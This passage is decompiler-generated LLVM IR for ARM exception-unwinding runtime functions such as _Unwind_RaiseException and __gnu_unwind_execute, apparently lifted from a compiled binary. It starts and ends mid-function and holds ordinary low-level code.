  %v4_18d68 = inttoptr i32 %v3_18d68 to i32*
  %v5_18d68 = load i32, i32* %v4_18d68, align 4
  store i32 %v5_18d68, i32* @r1, align 4
  %v12_18d68 = add i32 %tmp, 16
  %v13_18d68 = inttoptr i32 %v12_18d68 to i32*
  %v14_18d68 = load i32, i32* %v13_18d68, align 4
  store i32 %v14_18d68, i32* @r4, align 4
  %v15_18d68 = add i32 %tmp, 20
  %v16_18d68 = inttoptr i32 %v15_18d68 to i32*
  %v17_18d68 = load i32, i32* %v16_18d68, align 4
  store i32 %v17_18d68, i32* @r5, align 4
  %v18_18d68 = add i32 %tmp, 24
  %v19_18d68 = inttoptr i32 %v18_18d68 to i32*
  %v20_18d68 = load i32, i32* %v19_18d68, align 4
  store i32 %v20_18d68, i32* @r6, align 4
  %v21_18d68 = add i32 %tmp, 28
  %v22_18d68 = inttoptr i32 %v21_18d68 to i32*
  %v23_18d68 = load i32, i32* %v22_18d68, align 4
  store i32 %v23_18d68, i32* @r7, align 4
  %v24_18d68 = add i32 %tmp, 32
  %v25_18d68 = inttoptr i32 %v24_18d68 to i32*
  %v26_18d68 = load i32, i32* %v25_18d68, align 4
  store i32 %v26_18d68, i32* @r8, align 4
  %v27_18d68 = add i32 %tmp, 36
  %v28_18d68 = inttoptr i32 %v27_18d68 to i32*
  %v29_18d68 = load i32, i32* %v28_18d68, align 4
  store i32 %v29_18d68, i32* @sb, align 4
  %v30_18d68 = add i32 %tmp, 40
  %v31_18d68 = inttoptr i32 %v30_18d68 to i32*
  %v32_18d68 = load i32, i32* %v31_18d68, align 4
  store i32 %v32_18d68, i32* @sl, align 4
  store i32 %v8_18d5c, i32* @ip, align 4
  store i32 %v5_18d5c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_18d5c)
  ret i32 %v2_18d68

; uselistorder directives
  uselistorder i32 %v8_18d5c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 48, 49, 50, 51, 13, 14, 5, 0, 54, 6, 7, 52, 53, 11, 12, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 1, 88, 89, 90, 91, 92, 93, 94, 95, 96, 8, 97, 98, 99, 35, 36, 43, 44, 2, 37, 38, 39, 40, 41, 42, 33, 9, 17, 10, 34, 20, 15, 16, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 3, 18, 19, 45, 4, 46, 47 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 15, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26 }
  uselistorder i32* @sb, { 120, 121, 122, 7, 8, 9, 10, 1, 102, 103, 104, 105, 106, 107, 108, 109, 110, 113, 111, 112, 114, 94, 95, 77, 78, 18, 19, 20, 21, 22, 23, 24, 25, 2, 3, 4, 5, 6, 30, 31, 26, 27, 28, 29, 11, 12, 13, 14, 15, 16, 17, 32, 35, 33, 34, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 96, 97, 98, 99, 100, 101, 115, 116, 117, 118, 119 }
  uselistorder i32 36, { 17, 16, 4, 18, 6, 7, 5, 12, 15, 8, 13, 9, 0, 1, 2, 3, 10, 11, 14 }
  uselistorder i32* @r8, { 278, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 2, 277, 0, 44, 279, 13, 280, 45, 46, 47, 48, 31, 32, 33, 34, 35, 36, 37, 38, 39, 4, 40, 41, 42, 43, 49, 50, 51, 52, 14, 281, 28, 29, 5, 30, 213, 214, 6, 215, 216, 217, 241, 242, 243, 244, 245, 11, 246, 247, 248, 249, 250, 251, 252, 253, 200, 201, 202, 203, 185, 186, 187, 188, 189, 164, 165, 166, 167, 58, 59, 60, 61, 15, 101, 102, 103, 104, 105, 62, 63, 64, 65, 106, 107, 108, 109, 66, 67, 68, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 16, 27, 73, 74, 75, 76, 7, 53, 1, 54, 55, 56, 12, 57, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 92, 89, 90, 91, 93, 94, 95, 10, 96, 97, 98, 99, 100, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 8, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 190, 191, 192, 193, 194, 195, 9, 196, 197, 198, 199, 204, 205, 3, 206, 207, 208, 209, 210, 211, 212, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 254, 255, 256, 257, 258, 259 }
  uselistorder i32 32, { 87, 84, 85, 86, 51, 88, 89, 47, 57, 90, 46, 81, 52, 48, 66, 64, 65, 61, 62, 63, 73, 74, 67, 68, 59, 71, 72, 53, 79, 80, 82, 2, 3, 5, 4, 83, 7, 6, 9, 8, 11, 10, 60, 49, 54, 50, 75, 13, 12, 15, 14, 17, 16, 19, 18, 58, 21, 20, 23, 22, 24, 26, 25, 28, 27, 29, 30, 32, 31, 69, 70, 76, 33, 77, 34, 78, 35, 36, 37, 38, 55, 39, 40, 41, 56, 42, 0, 43, 1, 44, 45 }
  uselistorder i32 28, { 47, 10, 30, 48, 27, 49, 50, 51, 52, 7, 31, 32, 28, 29, 36, 11, 33, 12, 44, 45, 46, 8, 13, 14, 18, 15, 16, 17, 0, 20, 1, 21, 2, 22, 3, 23, 4, 24, 5, 25, 6, 26, 9, 19, 35, 34, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 24, { 98, 97, 99, 8, 9, 100, 0, 57, 58, 59, 60, 61, 62, 55, 56, 10, 63, 64, 74, 75, 65, 66, 7, 11, 96, 91, 92, 93, 1, 76, 77, 78, 37, 38, 12, 67, 68, 69, 48, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 54, 70, 71, 72, 73, 13, 79, 14, 80, 15, 81, 16, 17, 18, 19, 20, 82, 21, 22, 2, 23, 24, 25, 3, 26, 27, 4, 28, 29, 83, 30, 5, 84, 31, 85, 86, 87, 88, 32, 33, 6, 89, 34, 90, 35, 94, 36, 95 }
  uselistorder i32 20, { 127, 125, 126, 128, 1, 4, 8, 35, 129, 31, 130, 131, 132, 133, 5, 134, 135, 2, 136, 36, 9, 32, 33, 34, 37, 38, 39, 49, 50, 40, 41, 137, 118, 119, 120, 121, 122, 123, 124, 10, 114, 115, 116, 3, 51, 11, 52, 53, 0, 30, 43, 12, 45, 13, 46, 29, 44, 42, 47, 48, 14, 15, 16, 17, 54, 18, 55, 56, 57, 58, 59, 60, 19, 61, 62, 63, 64, 65, 66, 20, 67, 68, 69, 70, 71, 72, 73, 74, 75, 21, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 23, 90, 91, 24, 92, 93, 94, 95, 25, 96, 97, 26, 98, 99, 100, 101, 102, 103, 104, 6, 105, 27, 106, 107, 108, 109, 7, 110, 28, 111, 112, 113, 117 }
  uselistorder i32* @r1, { 185, 18, 20, 19, 4, 186, 187, 67, 68, 84, 47, 2, 189, 48, 188, 168, 49, 50, 51, 21, 69, 1, 70, 71, 22, 192, 23, 5, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 6, 210, 211, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 73, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 65, 3, 83, 24, 175, 119, 120, 212, 25, 214, 215, 216, 217, 131, 132, 31, 95, 32, 33, 34, 213, 26, 35, 176, 177, 178, 179, 180, 181, 182, 183, 184, 46, 113, 114, 170, 7, 166, 167, 8, 171, 174, 172, 9, 173, 96, 97, 27, 158, 153, 98, 159, 169, 133, 134, 12, 36, 37, 38, 39, 40, 41, 42, 10, 220, 221, 222, 223, 0, 224, 28, 85, 121, 154, 99, 218, 219, 190, 191, 29, 13, 100, 122, 123, 124, 125, 126, 30, 135, 136, 101, 102, 43, 44, 45, 103, 104, 105, 107, 108, 106, 86, 87, 89, 91, 88, 14, 90, 15, 92, 93, 94, 137, 109, 110, 111, 112, 115, 116, 117, 16, 118, 127, 128, 129, 17, 130, 162, 163, 11, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 155, 156, 157, 160, 161, 164, 165 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 31, 32, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 9, 8, 2, 10, 11, 12, 13, 14, 28, 29, 25, 26, 4, 5, 1, 6, 0, 7, 27, 30 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18d78 = load i32, i32* @r0, align 4
  ret i32 %v1_18d78
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18d80 = load i32, i32* @r0, align 4
  ret i32 %v1_18d80
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18d94 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18d98 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_18d94, i32 0)
  ret i32 %v2_18d98

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18db8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18dbc = call i32 @__gnu_Unwind_Resume(i32 %v2_18db8, i32 0)
  ret i32 %v2_18dbc

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18ddc = ptrtoint i32* %stack_var_-68 to i32
  %v2_18de0 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_18ddc, i32 0)
  ret i32 %v2_18de0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18e00 = ptrtoint i32* %stack_var_-68 to i32
  %v6_18e04 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18e00, i32 %arg2, i8* %arg3, i32 %v2_18e00)
  ret i32 %v6_18e04

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18e30 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18e38 = add i32 %tmp1, 76
  %v2_18e38 = inttoptr i32 %v1_18e38 to i32*
  %v3_18e38 = load i32, i32* %v2_18e38, align 4
  %v1_18e3c = add i32 %v3_18e38, 7
  %v2_18e3c = inttoptr i32 %v1_18e3c to i8*
  %v3_18e3c = load i8, i8* %v2_18e3c, align 1
  %v4_18e3c = zext i8 %v3_18e3c to i32
  %v1_18e40 = add i32 %v3_18e38, 8
  %v3_18e44 = mul nuw nsw i32 %v4_18e3c, 4
  %v2_18e48 = add i32 %v3_18e44, %v1_18e40
  %v3_18e48 = inttoptr i32 %v2_18e48 to i8*
  ret i8* %v3_18e48
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_18e58 = load i32, i32* @r6, align 4
  %v21_18e58 = load i32, i32* @lr, align 4
  %v0_18e5c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18e5c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_18e6c

dec_label_pc_18e6c:                               ; preds = %dec_label_pc_18e6c.backedge, %entry
  %v3_18e78 = phi i32 [ %v0_18e6c.pre, %dec_label_pc_18e6c.backedge ], [ %tmp, %entry ]
  %v1_18e6c = add i32 %v3_18e78, 8
  %v2_18e6c = inttoptr i32 %v1_18e6c to i8*
  %v3_18e6c = load i8, i8* %v2_18e6c, align 1
  %v4_18e6c = zext i8 %v3_18e6c to i32
  store i32 %v4_18e6c, i32* %r3.global-to-local, align 4
  %v2_18e70 = icmp eq i8 %v3_18e6c, 0
  store i1 %v2_18e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e70, label %dec_label_pc_18e80, label %.thread

.thread:                                          ; preds = %dec_label_pc_18e6c
  %v2_18e74 = add nsw i32 %v4_18e6c, -1
  store i32 %v2_18e74, i32* %r3.global-to-local, align 4
  %v2_18e78 = trunc i32 %v2_18e74 to i8
  store i8 %v2_18e78, i8* %v2_18e6c, align 1
  %v0_18e7c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e7c.pr.pr, label %.thread.dec_label_pc_18e80_crit_edge, label %dec_label_pc_18ea8

.thread.dec_label_pc_18e80_crit_edge:             ; preds = %.thread
  %v0_18e80.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e80

dec_label_pc_18e80:                               ; preds = %.thread.dec_label_pc_18e80_crit_edge, %dec_label_pc_18e6c
  %v0_18e80 = phi i32 [ %v0_18e80.pre, %.thread.dec_label_pc_18e80_crit_edge ], [ %v3_18e78, %dec_label_pc_18e6c ]
  %v1_18e80 = add i32 %v0_18e80, 9
  %v2_18e80 = inttoptr i32 %v1_18e80 to i8*
  %v3_18e80 = load i8, i8* %v2_18e80, align 1
  %v4_18e80 = zext i8 %v3_18e80 to i32
  store i32 %v4_18e80, i32* %r3.global-to-local, align 4
  %v2_18e84 = icmp eq i8 %v3_18e80, 0
  store i1 %v2_18e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e84, label %dec_label_pc_18f88, label %dec_label_pc_18e8c

dec_label_pc_18e8c:                               ; preds = %dec_label_pc_18f7c, %dec_label_pc_18e80
  %v2_18e90 = phi i32 [ %v0_18f7c, %dec_label_pc_18f7c ], [ %v0_18e80, %dec_label_pc_18e80 ]
  %v0_18e8c = phi i32 [ %v4_18f7c, %dec_label_pc_18f7c ], [ %v4_18e80, %dec_label_pc_18e80 ]
  %v1_18e8c = add nsw i32 %v0_18e8c, -1
  store i32 %v1_18e8c, i32* %r3.global-to-local, align 4
  %v1_18e90 = trunc i32 %v1_18e8c to i8
  %v3_18e90 = add i32 %v2_18e90, 9
  %v4_18e90 = inttoptr i32 %v3_18e90 to i8*
  store i8 %v1_18e90, i8* %v4_18e90, align 1
  %v0_18e94 = load i32, i32* @r5, align 4
  %v1_18e94 = add i32 %v0_18e94, 4
  %v2_18e94 = inttoptr i32 %v1_18e94 to i32*
  %v3_18e94 = load i32, i32* %v2_18e94, align 4
  store i32 %v3_18e94, i32* %r2.global-to-local, align 4
  %v1_18e98 = inttoptr i32 %v3_18e94 to i32*
  %v2_18e98 = load i32, i32* %v1_18e98, align 4
  store i32 %v2_18e98, i32* %r0.global-to-local, align 4
  %v4_18e98 = add i32 %v3_18e94, 4
  store i32 %v4_18e98, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18ea0 = inttoptr i32 %v0_18e94 to i32*
  store i32 %v2_18e98, i32* %v1_18ea0, align 4
  %v5_18ea0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18ea0, i32* %v2_18e94, align 4
  %v0_18ea4 = load i32, i32* %r3.global-to-local, align 4
  %v1_18ea4 = trunc i32 %v0_18ea4 to i8
  %v2_18ea4 = load i32, i32* @r5, align 4
  %v3_18ea4 = add i32 %v2_18ea4, 8
  %v4_18ea4 = inttoptr i32 %v3_18ea4 to i8*
  store i8 %v1_18ea4, i8* %v4_18ea4, align 1
  br label %dec_label_pc_18ea8

dec_label_pc_18ea8:                               ; preds = %.thread, %dec_label_pc_18e8c, %.thread6
  %v0_18ea8 = load i32, i32* @r5, align 4
  %v1_18ea8 = inttoptr i32 %v0_18ea8 to i32*
  %v2_18ea8 = load i32, i32* %v1_18ea8, align 4
  %v3_18eac = udiv i32 %v2_18ea8, 16777216
  store i32 %v3_18eac, i32* @r4, align 4
  store i32 %v3_18eac, i32* %ip.global-to-local, align 4
  %v3_18eb4 = mul i32 %v2_18ea8, 256
  store i32 %v3_18eb4, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_18ea8, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18eb4, i32* %v1_18ea8, align 4
  br i1 %tmp183, label %dec_label_pc_18f88, label %dec_label_pc_18ec4

dec_label_pc_18ec4:                               ; preds = %dec_label_pc_18ea8
  %v0_18ec4 = load i32, i32* @r4, align 4
  %v1_18ec4 = and i32 %v0_18ec4, 128
  store i32 %v1_18ec4, i32* %r1.global-to-local, align 4
  %v2_18ec4 = icmp eq i32 %v1_18ec4, 0
  store i1 %v2_18ec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ec4, label %dec_label_pc_18fa0, label %dec_label_pc_18ecc

dec_label_pc_18ecc:                               ; preds = %dec_label_pc_18ec4
  %v1_18ecc = and i32 %v0_18ec4, 240
  store i32 %v1_18ecc, i32* @r6, align 4
  %v7_18ed0 = icmp eq i32 %v1_18ecc, 128
  store i1 %v7_18ed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ed0, label %dec_label_pc_18ed8, label %dec_label_pc_18ffc

dec_label_pc_18ed8:                               ; preds = %dec_label_pc_18ecc
  %v0_18ed8 = load i32, i32* @r5, align 4
  %v1_18ed8 = add i32 %v0_18ed8, 8
  %v2_18ed8 = inttoptr i32 %v1_18ed8 to i8*
  %v3_18ed8 = load i8, i8* %v2_18ed8, align 1
  %v4_18ed8 = zext i8 %v3_18ed8 to i32
  store i32 %v4_18ed8, i32* %r3.global-to-local, align 4
  %v2_18edc = icmp eq i8 %v3_18ed8, 0
  store i1 %v2_18edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18edc, label %dec_label_pc_18eec, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18ed8
  %v2_18ee0 = add nsw i32 %v4_18ed8, -1
  store i32 %v2_18ee0, i32* %r3.global-to-local, align 4
  %v2_18ee4 = trunc i32 %v2_18ee0 to i8
  store i8 %v2_18ee4, i8* %v2_18ed8, align 1
  %v0_18ee8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18ee8.pr.pr, label %.thread3.dec_label_pc_18eec_crit_edge, label %dec_label_pc_18f1c

.thread3.dec_label_pc_18eec_crit_edge:            ; preds = %.thread3
  %v0_18eec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18eec

dec_label_pc_18eec:                               ; preds = %.thread3.dec_label_pc_18eec_crit_edge, %dec_label_pc_18ed8
  %v2_18f00 = phi i32 [ %v0_18eec.pre, %.thread3.dec_label_pc_18eec_crit_edge ], [ %v0_18ed8, %dec_label_pc_18ed8 ]
  %v1_18eec = add i32 %v2_18f00, 9
  %v2_18eec = inttoptr i32 %v1_18eec to i8*
  %v3_18eec = load i8, i8* %v2_18eec, align 1
  %v4_18eec = zext i8 %v3_18eec to i32
  store i32 %v4_18eec, i32* %r3.global-to-local, align 4
  %v2_18ef0 = icmp eq i8 %v3_18eec, 0
  store i1 %v2_18ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ef0, label %dec_label_pc_18f2c, label %dec_label_pc_18efc

dec_label_pc_18efc:                               ; preds = %dec_label_pc_18eec
  %v1_18efc = add nsw i32 %v4_18eec, -1
  store i32 %v1_18efc, i32* %r3.global-to-local, align 4
  %v1_18f00 = trunc i32 %v1_18efc to i8
  store i8 %v1_18f00, i8* %v2_18eec, align 1
  %v0_18f04 = load i32, i32* @r5, align 4
  %v1_18f04 = add i32 %v0_18f04, 4
  %v2_18f04 = inttoptr i32 %v1_18f04 to i32*
  %v3_18f04 = load i32, i32* %v2_18f04, align 4
  store i32 %v3_18f04, i32* %r2.global-to-local, align 4
  %v1_18f08 = inttoptr i32 %v3_18f04 to i32*
  %v2_18f08 = load i32, i32* %v1_18f08, align 4
  store i32 %v2_18f08, i32* %r0.global-to-local, align 4
  %v4_18f08 = add i32 %v3_18f04, 4
  store i32 %v4_18f08, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18f08, i32* %v2_18f04, align 4
  %v0_18f14 = load i32, i32* %r3.global-to-local, align 4
  %v1_18f14 = trunc i32 %v0_18f14 to i8
  %v2_18f14 = load i32, i32* @r5, align 4
  %v3_18f14 = add i32 %v2_18f14, 8
  %v4_18f14 = inttoptr i32 %v3_18f14 to i8*
  store i8 %v1_18f14, i8* %v4_18f14, align 1
  %v0_18f18 = load i32, i32* %r0.global-to-local, align 4
  %v1_18f18 = load i32, i32* @r5, align 4
  %v2_18f18 = inttoptr i32 %v1_18f18 to i32*
  store i32 %v0_18f18, i32* %v2_18f18, align 4
  br label %dec_label_pc_18f1c

dec_label_pc_18f1c:                               ; preds = %.thread3, %dec_label_pc_18efc
  %v0_18f1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18f1c, i32* %r3.global-to-local, align 4
  %v3_18f20 = mul i32 %v0_18f1c, 256
  store i32 %v3_18f20, i32* %r0.global-to-local, align 4
  %v1_18f24 = load i32, i32* @r5, align 4
  %v2_18f24 = inttoptr i32 %v1_18f24 to i32*
  store i32 %v3_18f20, i32* %v2_18f24, align 4
  %v0_18f28 = load i32, i32* %r3.global-to-local, align 4
  %v3_18f28 = udiv i32 %v0_18f28, 16777216
  br label %dec_label_pc_18f2c

dec_label_pc_18f2c:                               ; preds = %dec_label_pc_18eec, %dec_label_pc_18f1c
  %storemerge133 = phi i32 [ %v3_18f28, %dec_label_pc_18f1c ], [ 176, %dec_label_pc_18eec ]
  %v1_18f2c = load i32, i32* %ip.global-to-local, align 4
  %v4_18f2c = mul i32 %v1_18f2c, 256
  %v5_18f2c = or i32 %v4_18f2c, %storemerge133
  store i32 %v5_18f2c, i32* %r2.global-to-local, align 4
  %v7_18f30 = icmp eq i32 %v5_18f2c, 32768
  store i1 %v7_18f30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18f30, label %dec_label_pc_1913c, label %dec_label_pc_18f38

dec_label_pc_18f38:                               ; preds = %dec_label_pc_18f2c
  %v3_18f38 = mul i32 %v5_18f2c, 16
  store i32 %v3_18f38, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18f48 = and i32 %v3_18f38, 65520
  store i32 %v3_18f48, i32* %r2.global-to-local, align 4
  %v0_18f4c = load i32, i32* @r7, align 4
  store i32 %v0_18f4c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18f54 = call i32 @_Unwind_VRS_Pop(i32 %v0_18f4c, i32 %v3_18f48, i32 0, i32 0)
  store i32 %v4_18f54, i32* %r0.global-to-local, align 4
  %v2_18f58 = icmp eq i32 %v4_18f54, 0
  store i1 %v2_18f58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f58, label %dec_label_pc_18f60, label %dec_label_pc_1913c

dec_label_pc_18f60:                               ; preds = %dec_label_pc_18f38
  %v0_18f60 = load i32, i32* @r5, align 4
  %v1_18f60 = add i32 %v0_18f60, 8
  %v2_18f60 = inttoptr i32 %v1_18f60 to i8*
  %v3_18f60 = load i8, i8* %v2_18f60, align 1
  %v4_18f60 = zext i8 %v3_18f60 to i32
  store i32 %v4_18f60, i32* %r3.global-to-local, align 4
  %v0_18f64 = load i32, i32* @r4, align 4
  %v1_18f64 = and i32 %v0_18f64, 32768
  %v2_18f64 = icmp eq i32 %v1_18f64, 0
  store i1 %v2_18f64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f64, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_18f60
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18f60, %bb147
  %v2_18f6c = icmp eq i8 %v3_18f60, 0
  store i1 %v2_18f6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f6c, label %dec_label_pc_18f7c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_18f70 = add nsw i32 %v4_18f60, -1
  store i32 %v2_18f70, i32* %r3.global-to-local, align 4
  %v2_18f74 = trunc i32 %v2_18f70 to i8
  store i8 %v2_18f74, i8* %v2_18f60, align 1
  %v0_18f78.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f78.pr.pr, label %.thread6.dec_label_pc_18f7c_crit_edge, label %dec_label_pc_18ea8

.thread6.dec_label_pc_18f7c_crit_edge:            ; preds = %.thread6
  %v0_18f7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f7c

dec_label_pc_18f7c:                               ; preds = %bb148, %.thread6.dec_label_pc_18f7c_crit_edge
  %v0_18f7c = phi i32 [ %v0_18f7c.pre, %.thread6.dec_label_pc_18f7c_crit_edge ], [ %v0_18f60, %bb148 ]
  %v1_18f7c = add i32 %v0_18f7c, 9
  %v2_18f7c = inttoptr i32 %v1_18f7c to i8*
  %v3_18f7c = load i8, i8* %v2_18f7c, align 1
  %v4_18f7c = zext i8 %v3_18f7c to i32
  store i32 %v4_18f7c, i32* %r3.global-to-local, align 4
  %v2_18f80 = icmp eq i8 %v3_18f7c, 0
  store i1 %v2_18f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f80, label %dec_label_pc_18f88, label %dec_label_pc_18e8c

dec_label_pc_18f88:                               ; preds = %dec_label_pc_18f7c, %dec_label_pc_18e80, %dec_label_pc_18ea8
  %v0_18f88 = load i32, i32* @sl, align 4
  %v2_18f88 = icmp eq i32 %v0_18f88, 0
  store i1 %v2_18f88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f88, label %dec_label_pc_19050, label %bb149

bb149:                                            ; preds = %dec_label_pc_18f88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_18f94:                               ; preds = %bb149, %dec_label_pc_19504, %dec_label_pc_193a4, %dec_label_pc_191c8, %dec_label_pc_19180, %dec_label_pc_1913c, %dec_label_pc_19050
  %v1_18f9c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_19504 ], [ 9, %dec_label_pc_193a4 ], [ 9, %dec_label_pc_191c8 ], [ 9, %dec_label_pc_19180 ], [ 9, %dec_label_pc_1913c ], [ %v0_19084, %dec_label_pc_19050 ]
  store i32 %v9_18e58, i32* %r6.global-to-local, align 4
  store i32 %v21_18e58, i32* @lr, align 4
  ret i32 %v1_18f9c

dec_label_pc_18fa0:                               ; preds = %dec_label_pc_18ec4
  %v1_18fa0 = mul i32 %v0_18ec4, 4
  %v3_18fa4 = and i32 %v1_18fa0, 252
  store i32 %v3_18fa4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18fb0 = load i32, i32* @r7, align 4
  store i32 %v0_18fb0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_18fb8 = add nuw nsw i32 %v3_18fa4, 4
  store i32 %v1_18fb8, i32* %r6.global-to-local, align 4
  %v5_18fc0 = call i32 @_Unwind_VRS_Get(i32 %v0_18fb0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18fc4 = load i32, i32* @r4, align 4
  %v1_18fc4 = and i32 %v0_18fc4, 64
  %v2_18fc4 = icmp eq i32 %v1_18fc4, 0
